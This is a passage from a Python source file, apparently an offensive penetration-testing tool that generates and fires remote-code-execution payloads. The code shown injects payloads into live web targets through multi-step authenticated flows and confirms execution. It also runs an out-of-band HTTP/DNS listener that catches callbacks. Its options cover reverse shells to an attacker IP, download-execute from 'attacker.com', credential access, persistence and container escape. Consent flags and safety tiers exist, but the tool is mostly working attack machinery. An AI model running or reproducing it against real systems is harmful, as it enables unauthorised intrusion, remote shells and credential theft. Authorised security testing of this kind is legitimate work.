                    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
                elif "json" in step:
                    data = subst(step["json"], ctx).replace("FUZZ", payload).encode()
                    headers.setdefault("Content-Type", "application/json")
                elif "form" in step:
                    form = {k: subst(str(v), ctx).replace("FUZZ", payload) for k, v in step["form"].items()}
                    data = urllib.parse.urlencode(form).encode()
                    headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                elif "body" in step:
                    data = subst(step["body"], ctx).replace("FUZZ", payload).encode()
                req = urllib.request.Request(url, data=data, headers=headers,
                                             method=step.get("method", "GET" if data is None else "POST"))
                try:
                    with opener.open(req, timeout=timeout) as resp:
                        text = resp.read().decode(errors="replace")
                except urllib.error.HTTPError as exc:
                    text = exc.read().decode(errors="replace")
                except Exception as exc:
                    text = str(exc)
                for var, rgx in (step.get("extract") or {}).items():
                    m = re.search(rgx, text)
                    if m:
                        ctx[var] = m.group(1)
                if confirm_key in (step.get("name"), idx) or (confirm_key is None and idx == len(steps) - 1):
                    confirm_body = text
            return ctx, confirm_body

        results: List[Dict[str, Any]] = []
        seen: Set[str] = set()
        pending_oob: List[Dict[str, Any]] = []
        for record in records:
            if record.payload in seen:
                continue
            seen.add(record.payload)
            token = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
            _, confirm_body = run_steps(record.payload, token)
            is_oob = "{callback}" in record.payload
            if is_oob:
                pending_oob.append({"record": record, "token": token})
                verdict, detail = "oob-pending", f"awaiting callback token {token}"
            elif record.match and self._encoded_search(record.match, confirm_body):
                verdict, detail = "confirmed", f"matched /{record.match}/"
            elif record.match:
                verdict, detail = "no-match", ""
            else:
                verdict, detail = "no-signature", "no in-band oracle; deliver as OOB to confirm"
            results.append({"verdict": verdict, "detail": detail, "payload": record.payload,
                            "category": record.category, "context": record.context, "token": token})
            if delay:
                time.sleep(delay)
            if max_payloads and len(results) >= max_payloads:
                break

        # Give blind/async callbacks a moment to arrive, then resolve OOB verdicts.
        if pending_oob and listener is not None:
            deadline = time.time() + 6
            while time.time() < deadline:
                hit_tokens = {h.get("token") for h in listener.hits}
                if all(p["token"] in hit_tokens for p in pending_oob):
                    break
                time.sleep(0.5)
            hit_tokens = {h.get("token") for h in listener.hits}
            for result in results:
                if result["token"] in hit_tokens and result["verdict"] == "oob-pending":
                    result["verdict"] = "confirmed"
                    result["detail"] = f"OOB callback received for token {result['token']}"
                elif result["verdict"] == "oob-pending":
                    result["detail"] = f"no callback received for token {result['token']}"
        return results

    def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
        audit_path = Path("exploit_audit.log")
        try:
            with audit_path.open("a", encoding="utf-8") as audit_file:
                timestamp = datetime.now(timezone.utc).isoformat()
                audit_file.write(
                    f"{timestamp} | token={watermark_token} | ip={self.attacker_ip} | domain={self.attacker_domain} | args={vars(arguments)}\n"
                )
        except Exception as exc:
            logger.error("Unable to log exploitation usage: %s", exc)

class OOBListener:
    """A lightweight out-of-band listener that records DNS/HTTP callbacks and
    correlates each one back to the payload whose unique token produced it.

    It closes the OOB loop: generate OOB payloads -> fire them (e.g. --verify-url
    or your own tooling) -> the target calls back to ``{token}.{oob-domain}`` ->
    this listener maps the token to the exact payload from a ``.map.jsonl``
    manifest. For real engagements the OOB domain's NS/A records must point here;
    for lab use, point payloads straight at this host/port.
    """

    def __init__(self, tokens: Optional[Dict[str, Dict[str, Any]]] = None,
                 answer_ip: str = "127.0.0.1", log_path: Optional[str] = None):
        self.tokens = tokens or {}
        self.answer_ip = answer_ip
        self.log_path = log_path
        self.hits: List[Dict[str, Any]] = []
        self._servers: List[Any] = []

    def _correlate(self, host: str, path: str):
        hay = f"{host} {path}".lower()
        for token, entry in self.tokens.items():
            if token and token.lower() in hay:
                return token, entry
        label = host.split(".")[0].lower() if host else ""
        return (label or None), None

    def record(self, proto: str, source: str, host: str, path: str = "") -> Dict[str, Any]:
        token, entry = self._correlate(host, path)
        hit = {
            "time": datetime.now(timezone.utc).isoformat(), "proto": proto,
            "source": source, "host": host, "path": path, "token": token,
            "payload": entry.get("payload") if entry else None,
            "category": entry.get("category") if entry else None,
            "context": entry.get("context") if entry else None,
        }
        self.hits.append(hit)
        where = f"{host or path}"
        if entry:
            print(f"[HIT] {proto} token={token} from {source} -> {entry.get('payload')} "
                  f"[{entry.get('category')}/{entry.get('context')}]")
        else:
            print(f"[HIT] {proto} from {source} -> {where}  (token={token}; not in manifest)")
        if self.log_path:
            try:
                with open(self.log_path, "a", encoding="utf-8") as log_file:
                    log_file.write(json.dumps(hit, ensure_ascii=True) + "\n")
            except Exception as exc:
                logger.error("Unable to write OOB hit log: %s", exc)
        return hit

    def start_http(self, port: int) -> Any:
        import http.server
        import socketserver

        listener = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _handle(self):
                host = self.headers.get("Host", "").split(":")[0]
                listener.record("http", self.client_address[0], host, self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = _handle
            do_POST = _handle

        server = socketserver.ThreadingTCPServer(("0.0.0.0", port), Handler)
        server.daemon_threads = True
        self._servers.append(server)
        import threading
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server

    def _parse_dns_qname(self, data: bytes) -> str:
        labels, i = [], 12
        while i < len(data) and data[i] != 0:
            length = data[i]
            labels.append(data[i + 1:i + 1 + length].decode(errors="replace"))
            i += 1 + length
        return ".".join(labels)

    def _dns_response(self, query: bytes) -> bytes:
        header = query[:2] + b"\x81\x80" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00"
        i = 12
        while i < len(query) and query[i] != 0:
            i += 1 + query[i]
        i += 1 + 4  # null byte + qtype + qclass
        question = query[12:i]
        rdata = bytes(int(o) for o in self.answer_ip.split("."))
        answer = b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00\x00\x1e" + b"\x00\x04" + rdata
        return header + question + answer

    def start_dns(self, port: int) -> bool:
        import socket
        import threading

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", port))
        except OSError as exc:
            logger.warning("DNS listener could not bind port %s (%s); continuing with HTTP only.", port, exc)
            return False

        def loop():
            while True:
                try:
                    data, addr = sock.recvfrom(512)
                except OSError:
                    break
                name = self._parse_dns_qname(data)
                try:
                    sock.sendto(self._dns_response(data), addr)
                except OSError:
                    pass
                self.record("dns", addr[0], name)

        threading.Thread(target=loop, daemon=True).start()
        return True


# Categories whose payloads have a real-world side effect when fired at a live
# target (an outbound connection, a callback, credential access, a foothold),
# as opposed to read-only enumeration. Surfaced in the verification plan and
# held back unless the operator raises --verify-active-risk.
HIGH_RISK_CATEGORIES = {
    "reverse_shells", "download_execute", "credential_access",
    "lateral_movement", "container_escape", "cloud_metadata", "persistence",
}


def build_verification_plan(records: List[PayloadRecord], method: str, url: str,
                            attacker_ip: Optional[str] = None,
                            attacker_domain: Optional[str] = None,
                            max_payloads: Optional[int] = None):
    """Summarise what a verification run will send *before* anything is fired,
    so a high-impact set is never sent silently. Returns ``(lines, to_send)``
    where ``to_send`` is the deduplicated, capped record list actually sent."""
    to_send: List[PayloadRecord] = []
    seen: Set[str] = set()
    for record in records:
        if record.payload in seen:
            continue
        seen.add(record.payload)
        to_send.append(record)
    if max_payloads:
        to_send = to_send[:max_payloads]

    by_safety: Dict[str, int] = {}
    high_risk: Dict[str, int] = {}
    destinations: Set[str] = set()
    for record in to_send:
        by_safety[record.safety] = by_safety.get(record.safety, 0) + 1
        if record.category in HIGH_RISK_CATEGORIES:
            high_risk[record.category] = high_risk.get(record.category, 0) + 1
        if record.oob_host:
            destinations.add(record.oob_host.split(".", 1)[-1] if "." in record.oob_host else record.oob_host)
        if attacker_ip and attacker_ip in record.payload:
            destinations.add(attacker_ip)
        if attacker_domain and attacker_domain in record.payload:
            destinations.add(attacker_domain)

    lines = [
        f"[plan] {method} {url}",
        f"[plan] {len(to_send)} unique payloads to send"
        + (f" (capped at --max-payloads {max_payloads})" if max_payloads else ""),
        "[plan] safety tiers: " + (", ".join(f"{k}={v}" for k, v in sorted(by_safety.items())) or "none"),
    ]
    if high_risk:
        lines.append("[plan] HIGH-IMPACT categories: "
                     + ", ".join(f"{k}={v}" for k, v in sorted(high_risk.items())))
    if destinations:
        lines.append("[plan] network / out-of-band callback destinations: "
                     + ", ".join(sorted(destinations)))
    return lines, to_send


def load_token_manifest(path: str) -> Dict[str, Dict[str, Any]]:
    """Load a .map.jsonl manifest into a token -> entry dict."""
    tokens: Dict[str, Dict[str, Any]] = {}
    try:
        with open(path, "r", encoding="utf-8") as manifest:
            for line in manifest:
                line = line.strip()
                if not line:
                    continue
                entry = json.loads(line)
                if entry.get("token"):
                    tokens[entry["token"]] = entry
    except Exception as exc:
        logger.error("Unable to load manifest %s: %s", path, exc)
    return tokens


def main():
    parser = argparse.ArgumentParser(description="Generate RCE payloads for penetration testing")
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-o", "--output", default="rce_payloads.txt",
                       help="Output file path (default: rce_payloads.txt)")
    parser.add_argument("--attacker-ip", default="192.168.1.100",
                       help="Attacker IP for reverse shells (default: 192.168.1.100)")
    parser.add_argument("--attacker-domain", default="attacker.com",
                       help="Attacker domain for download payloads (default: attacker.com)")
    parser.add_argument("--max-payloads", type=int, default=None,
                       help="Maximum number of payloads to generate (default: unlimited)")
    parser.add_argument("--contexts", nargs="+", default=None,
                       help="Contexts to generate, including raw (default: all compatible contexts)")
    parser.add_argument("--categories", nargs="+", default=None,
                       help="Categories to generate (default: all)")
    parser.add_argument("--encodings", nargs="+", default=None,
                       help="Encoding methods to apply (default: mode-specific)")
    parser.add_argument("--environments", nargs="+", default=None,
                       help="Environments to generate (default: all)")
    parser.add_argument("--template-file", type=str, default=None,
                        help="Path to a custom payload template file (JSON or YAML)")
    parser.add_argument("--detection-only", action="store_true",
                        help="Generate benign payloads for detection and validation")
    parser.add_argument("--output-format", choices=["text", "jsonl", "burp", "ffuf", "nuclei"], default="text",
                        help="text/jsonl single file, burp (per-context wordlists + optional Burp request), ffuf (wordlists + ready request.txt/run.sh when a profile request is given), or nuclei (runnable templates)")
    parser.add_argument("--oob-domain", default=None,
                        help="Collaborator/interactsh domain for out-of-band payloads; each payload gets a unique subdomain token")
    parser.add_argument("--verify-url", default=None,
                        help="AUTHORISED target URL with a FUZZ marker; fires payloads and confirms execution via each payload's oracle instead of writing a file")
    parser.add_argument("--verify-method", default=None,
                        help="HTTP method for --verify-url (default GET, or POST when --verify-data is set)")
    parser.add_argument("--verify-data", default=None,
                        help="Request body for verification; put FUZZ where the payload goes")
    parser.add_argument("--verify-header", action="append", default=None,
                        help="Header 'Name: value' for verification (repeatable); may contain FUZZ")
    parser.add_argument("--verify-delay", type=float, default=0.0,
                        help="Seconds to wait between verification requests (rate limiting)")
    parser.add_argument("--verify-timeout", type=float, default=8.0,
                        help="Per-request timeout for verification (seconds)")
    parser.add_argument("--verify-url-location", choices=["query_value", "url_path", "raw"], default="query_value",
                        help="How to encode the payload where FUZZ appears in --verify-url "
                             "(default query_value: percent-encoded, as a query parameter)")
    parser.add_argument("--verify-body-location", choices=["json_string", "form_value", "raw"], default=None,
                        help="How to encode the payload where FUZZ appears in --verify-data "
                             "(default: auto-detected from Content-Type/body shape). json_string "
                             "escapes for a JSON body WITHOUT percent-encoding; form_value percent-"
                             "encodes for x-www-form-urlencoded; raw sends it verbatim")
    parser.add_argument("--verify-allow-destructive", action="store_true",
                        help="Allow --verify-url to fire destructive payloads (persistence/backdoors/etc.); off by default")
    parser.add_argument("--verify-active-risk", choices=["safe", "intrusive", "stateful"], default=None,
                        help="Highest safety tier --verify-url may fire (default: safe). The default holds "
                             "back reverse shells, download-execute, credential access, lateral movement, "
                             "container escape, cloud-metadata and OOB payloads; pass 'intrusive' to include "
                             "them. Independent of --max-safety, which only governs file output")
    parser.add_argument("--verify-chain", default=None,
                        help="Path to a JSON chain profile: deliver each payload through a multi-step, "
                             "session-aware flow (login/CSRF -> prerequisites -> payload delivery -> trigger) "
                             "and confirm in-band (match oracle) or out-of-band (a {callback} URL to the "
                             "built-in listener). Reaches authenticated, file-content and blind/async sinks.")
    parser.add_argument("--doctor", action="store_true",
                        help="Run a corpus integrity check (template found, parses, payload counts) and exit non-zero if it is missing or empty")
    parser.add_argument("--listen", action="store_true",
                        help="Run the built-in OOB listener (HTTP+DNS) that records callbacks and correlates them to payload tokens")
    parser.add_argument("--listen-http-port", type=int, default=8080,
                        help="HTTP port for the OOB listener (default 8080)")
    parser.add_argument("--listen-dns-port", type=int, default=5335,
                        help="UDP DNS port for the OOB listener (default 5335; use 53 for real DNS, needs root + NS delegation)")
    parser.add_argument("--listen-answer-ip", default="127.0.0.1",
                        help="IP returned by the listener's DNS answers (default 127.0.0.1)")
    parser.add_argument("--correlate", default=None,
                        help="A .map.jsonl manifest to correlate received tokens back to their payloads")
    parser.add_argument("--listen-log", default=None,
                        help="Append received OOB hits to this file as JSONL")
    parser.add_argument("--include-metadata", action="store_true",
                        help="Write indicator and safety metadata alongside payload output")
    parser.add_argument("--max-safety", choices=["safe", "intrusive", "stateful"], default=None,
                        help="Highest safety tier to include")
    parser.add_argument("--include-blocking", action="store_true",
                        help="Include blocking or timing-based payloads that are excluded by default")
    parser.add_argument("--acknowledge-consent", action="store_true",
                        help="Acknowledge that exploitation payloads will only be used with proper authorization")
    parser.add_argument("--watermark", action="store_true",
                        help="Embed a traceable watermark token into each exploitation payload (audit logging happens either way)")
    parser.add_argument("--target-profile", default=None,
                        help="JSON profile describing the target (environments, contexts, categories, encodings, deny_chars, max_length, oob_domain); CLI flags override it")
    parser.add_argument("--deny-chars", default=None,
                        help="Drop payloads containing any of these characters (e.g. \"'\\\"\" for a target that rejects quotes)")
    parser.add_argument("--max-length", type=int, default=None,
                        help="Drop payloads longer than this many characters")
    parser.add_argument("--sink-needs-separator", action="store_true", default=None,
                        help="Sink concatenates input mid shell command: keep only separator-led payloads")
    parser.add_argument("--sink-blind", action="store_true", default=None,
                        help="Sink returns no output: keep only out-of-band confirmable payloads (timing/OOB)")
    parser.add_argument("--sink-decodes", nargs="+", default=None,
                        help="Encodings the sink decodes before use (e.g. base64); those variants become valid and are generated")

    args = parser.parse_args()

    if args.listen:
        import time
        tokens = load_token_manifest(args.correlate) if args.correlate else {}
        listener = OOBListener(tokens=tokens, answer_ip=args.listen_answer_ip, log_path=args.listen_log)
        listener.start_http(args.listen_http_port)
        dns_ok = listener.start_dns(args.listen_dns_port)
        print(f"[listen] OOB listener up — HTTP :{args.listen_http_port}"
              + (f", DNS :{args.listen_dns_port}" if dns_ok else " (DNS disabled)"))
        if tokens:
            print(f"[listen] correlating against {len(tokens)} tokens from {args.correlate}")
        else:
            print("[listen] no --correlate manifest; hits will be reported without payload mapping")
        print("[listen] waiting for callbacks — Ctrl+C to stop")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            unique = {h["token"] for h in listener.hits if h["token"]}
            correlated = {h["token"] for h in listener.hits if h["payload"]}
            print(f"\n[listen] stopped: {len(listener.hits)} callbacks, "
                  f"{len(unique)} unique tokens, {len(correlated)} correlated to a payload.")
        return

    # A target profile supplies defaults for the selection and filter options;
    # any explicit CLI flag overrides the matching profile field.
    profile: Dict[str, Any] = {}
    if args.target_profile:
        try:
            with open(args.target_profile, "r", encoding="utf-8") as profile_file:
                profile = json.load(profile_file)
        except Exception as exc:
            print(f"[!] Unable to load target profile {args.target_profile}: {exc}")
            return
        logger.info("Loaded target profile '%s' from %s", profile.get("name", "?"), args.target_profile)

    def from_profile(cli_value, key):
        return cli_value if cli_value is not None else profile.get(key)

    selected_environments = from_profile(args.environments, "environments")
    selected_contexts = from_profile(args.contexts, "contexts")
    selected_categories = from_profile(args.categories, "categories")
    selected_encodings = from_profile(args.encodings, "encodings")
    max_length = from_profile(args.max_length, "max_length")
    deny_chars = args.deny_chars
    if deny_chars is None and profile.get("deny_chars") is not None:
        deny_chars = "".join(profile["deny_chars"])

    # Sink-shape awareness: narrow generation to what this sink could execute.
    needs_separator = bool(from_profile(args.sink_needs_separator, "sink_needs_separator"))
    blind = bool(from_profile(args.sink_blind, "sink_blind"))
    sink_decodes = from_profile(args.sink_decodes, "sink_decodes") or []
    # A profile `request` block shapes the exported Burp/Nuclei requests.
    request_template = profile.get("request")

    template_path = Path(args.template_file) if args.template_file else None
    # Initialize generator
    generator = RCEKit(
        attacker_ip=args.attacker_ip,
        attacker_domain=args.attacker_domain,
        template_path=template_path,
    )

    if args.doctor:
        ok, report = generator.check_integrity()
        print("[doctor] RCEKit corpus integrity check")
        for line in report:
            print(line)
        print("[doctor] OK" if ok else "[doctor] PROBLEMS FOUND")
        return 0 if ok else 1

    if sink_decodes:
        # The sink decodes these, so the encoded form is a valid, executable
        # delivery here — add them to the encoding set that is in effect.
        current = selected_encodings if selected_encodings is not None else list(generator.default_encodings)
        additions = [e for e in sink_decodes if e in generator.encoding_methods]
        selected_encodings = list(dict.fromkeys(current + additions))

    mode = "detection" if args.detection_only else "exploit"

    # Refuse to run on a missing or empty corpus rather than silently emitting
    # zero payloads (e.g. the corpus file was quarantined by EDR after clone).
    corpus_ok, corpus_reason = generator.corpus_ready(mode)
    if not corpus_ok:
        print(f"[!] Payload corpus is not usable: {corpus_reason}")
        print("[!] Refusing to run with an incomplete corpus. Run "
              "'python rcekit.py --doctor' to diagnose, or pass --template-file with a valid corpus.")
        return 1

    if mode == "exploit" and not args.acknowledge_consent:
        print("[!] Exploitation mode requires explicit consent. Re-run with --acknowledge-consent after confirming authorization.")
        return

    watermark_token = None
    if mode == "exploit":
        # Always record an audit entry for accountability. Only embed the token
        # into the payloads themselves when explicitly requested, so the default
        # output stays clean and copy-pasteable for operational use.
        audit_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(audit_token, args)
        if args.watermark:
            watermark_token = audit_token

    max_safety = args.max_safety or ("safe" if mode == "detection" else "intrusive")
    include_blocking = args.include_blocking
    oob_domain = from_profile(args.oob_domain, "oob_domain")
    if args.output_format == "nuclei":
        # Nuclei templates rely on the time-based, OOB, and reflection oracles,
        # so pull in blocking/intrusive payloads and provide a placeholder OOB
        # host that the exporter rewrites to {{interactsh-url}}.
        include_blocking = True
        max_safety = "intrusive"
        if not oob_domain:
            oob_domain = "oob.interact.sh"

    if args.verify_chain:
        if not args.acknowledge_consent:
            print("[!] --verify-chain actively sends payloads to the target. Re-run with "
                  "--acknowledge-consent to confirm you are authorised to test it.")
            return
        with open(args.verify_chain, "r", encoding="utf-8") as chain_file:
            chain = json.load(chain_file)
        verify_max_safety = args.verify_active_risk or "safe"
        records = generator.generate_payload_records(
            selected_contexts=selected_contexts, selected_categories=selected_categories,
            selected_encodings=selected_encodings, selected_environments=selected_environments,
            mode=mode, watermark_token=watermark_token, max_safety=verify_max_safety,
            include_blocking=include_blocking, oob_domain=oob_domain,
        )
        records = list(records)
        verify_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(f"VERIFY-CHAIN:{verify_token} base={chain.get('base')}", args)
        print(f"[verify-chain] {chain.get('base')}  ({len(chain.get('steps', []))} steps, "
              f"{len(records)} payloads)  (authorised target)")
        results = generator.run_verification_chain(
            records, chain, delay=args.verify_delay, timeout=args.verify_timeout,
            max_payloads=args.max_payloads)
        by_verdict: Dict[str, int] = {}
        for result in results:
            by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
        confirmed = [r for r in results if r["verdict"] == "confirmed"]
        print(f"[verify-chain] sent {len(results)} unique payloads: " +
              ", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())))
        if confirmed:
            print(f"\n[verify-chain] CONFIRMED execution ({len(confirmed)}):")
            for result in confirmed:
                print(f"  [{result['category']}] {result['payload']!r}   ({result['detail']})")
        else:
            print("\n[verify-chain] No execution confirmed.")
        return

    if args.verify_url:
        if not args.acknowledge_consent:
            print("[!] --verify-url actively sends payloads to the target. Re-run with "
                  "--acknowledge-consent to confirm you are authorised to test it.")
            return
        if "FUZZ" not in args.verify_url and not (args.verify_data and "FUZZ" in args.verify_data) \
                and not any("FUZZ" in h for h in (args.verify_header or [])):
            print("[!] No FUZZ marker found in --verify-url/--verify-data/--verify-header; "
                  "add FUZZ where the payload should be injected.")
            return
        method = args.verify_method or ("POST" if args.verify_data else "GET")
        verify_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(f"VERIFY:{verify_token} url={args.verify_url}", args)
        # Safe by default: verification fires only low-impact proofs unless the
        # operator explicitly raises the ceiling. This holds back reverse shells,
        # download-execute, credential access, lateral movement, container
        # escape, cloud-metadata and OOB payloads (all classified 'intrusive'),
        # independent of --max-safety (which only governs file output).
        verify_max_safety = args.verify_active_risk or "safe"
        records = generator.generate_payload_records(
            selected_contexts=selected_contexts, selected_categories=selected_categories,
            selected_encodings=selected_encodings, selected_environments=selected_environments,
            mode=mode, watermark_token=watermark_token, max_safety=verify_max_safety,
            include_blocking=include_blocking, oob_domain=oob_domain,
        )
        if deny_chars or max_length or needs_separator or blind:
            records = generator._filter_by_profile(records, deny_chars, max_length, needs_separator, blind)
        skipped_destructive = [0]
        if not args.verify_allow_destructive:
            # Never install backdoors / tamper with a live target unless asked.
            def _drop_destructive(source):
                for record in source:
                    if record.destructive:
                        skipped_destructive[0] += 1
                        continue
                    yield record

            records = _drop_destructive(records)
        # When capping, interleave so --max-payloads fires a balanced sample
        # across categories/environments instead of exhausting the first bucket.
        if args.max_payloads:
            records = generator._interleave(
                records, key=lambda r: (r.category, r.environment, r.sink))
        # Materialise (this also tallies the destructive skips) and show an
        # execution plan before anything is fired.
        records = list(records)
        plan_lines, to_send = build_verification_plan(
            records, method, args.verify_url,
            attacker_ip=generator.attacker_ip, attacker_domain=generator.attacker_domain,
            max_payloads=args.max_payloads)
        for line in plan_lines:
            print(line)
        if skipped_destructive[0]:
            print(f"[plan] holding back {skipped_destructive[0]} destructive payloads "
                  "(persistence/backdoors/etc.); pass --verify-allow-destructive to include them.")
        if verify_max_safety == "safe":
            print("[plan] low-impact (safe) payloads only; pass --verify-active-risk intrusive to also "
                  "fire reverse shells, download-execute, credential access, lateral movement and OOB.")
        print(f"[verify] {method} {args.verify_url}  (authorised target)")
        results = generator.run_verification(
            to_send, url=args.verify_url, method=method, data=args.verify_data,
            headers=args.verify_header, delay=args.verify_delay, timeout=args.verify_timeout,
            max_payloads=args.max_payloads,
            url_location=args.verify_url_location, body_location=args.verify_body_location,
        )
        by_verdict: Dict[str, int] = {}
        for result in results:
            by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
        confirmed = [r for r in results if r["verdict"] == "confirmed"]
        print(f"[verify] sent {len(results)} unique payloads: " +
              ", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())))
        if confirmed:
            print(f"\n[verify] CONFIRMED execution ({len(confirmed)}):")
            for result in confirmed:
                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
        inconclusive = [r for r in results if r["verdict"] == "inconclusive"]
        if inconclusive:
            print(f"\n[verify] {len(inconclusive)} INCONCLUSIVE (signature seen without the payload — "
                  "the target reflects it regardless, so it is not proof of execution):")
            for result in inconclusive:
                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
        oob_pending = [r for r in results if r["verdict"] == "oob-pending"]
        if oob_pending:
            print(f"\n[verify] {len(oob_pending)} OOB payloads sent — check your listener for the tokens.")
        timing_candidates = [r for r in results if r["verdict"] == "timing-candidate-on-timeout"]
        if timing_candidates:
            print(f"\n[verify] {len(timing_candidates)} TIMING CANDIDATES timed out (the hang may be the "
                  "expected delay — raise --verify-timeout above it to confirm):")
            for result in timing_candidates:
                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
        if not confirmed and not oob_pending:
            print("\n[verify] No execution confirmed. The target may be patched, or the payloads "
                  "may not fit its sink/context (try --target-profile or a different --environments/--contexts).")
        return

    if args.output_format == "text" and not args.include_metadata and selected_encodings:
        # A decoder-required encoding is fine when the sink is known to decode it.
        risky = sorted((set(selected_encodings) & generator.decoder_required_encodings) - set(sink_decodes))
        if risky:
            print(
                f"[!] Warning: encoding(s) {risky} emit bare blobs that only execute where the "
                "SINK base64/hex-decodes the input. In plain text they may look like working "
                "payloads but do nothing on their own. Use --include-metadata (or --output-format "
                "jsonl) to see the required decode path, or use base64_decode_exec for a "
                "self-contained shell payload."
            )

    count = generator.save_payloads_to_file(
        file_path=args.output,
        max_payloads=args.max_payloads,
        output_format=args.output_format,
        include_metadata=args.include_metadata or args.output_format == "jsonl",
        deny_chars=deny_chars,
        max_length=max_length,
        needs_separator=needs_separator,
        blind=blind,
        request_template=request_template,
        selected_contexts=selected_contexts,
        selected_categories=selected_categories,
        selected_encodings=selected_encodings,
        selected_environments=selected_environments,
        mode=mode,
        watermark_token=watermark_token,
        max_safety=max_safety,
        include_blocking=include_blocking,
        oob_domain=oob_domain,
    )

    print(f"Generated {count} payloads to {args.output} in {mode} mode")

if __name__ == "__main__":
    sys.exit(main())
